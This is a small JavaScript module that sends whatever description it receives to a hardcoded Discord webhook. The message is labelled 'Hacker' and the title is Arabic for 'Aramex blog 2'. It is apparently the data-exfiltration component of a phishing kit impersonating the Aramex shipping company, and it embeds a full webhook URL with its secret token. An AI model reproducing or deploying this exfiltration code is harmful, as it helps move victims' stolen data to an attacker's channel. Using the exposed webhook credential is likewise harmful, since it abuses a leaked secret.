import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1327732590198788159/Ymnq9bEwjQOFpwkw6tHUYKcPkLrEaNn3T6dRxCROfTCSCUMdJhL3m719N9bqZzuIC4Cs",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
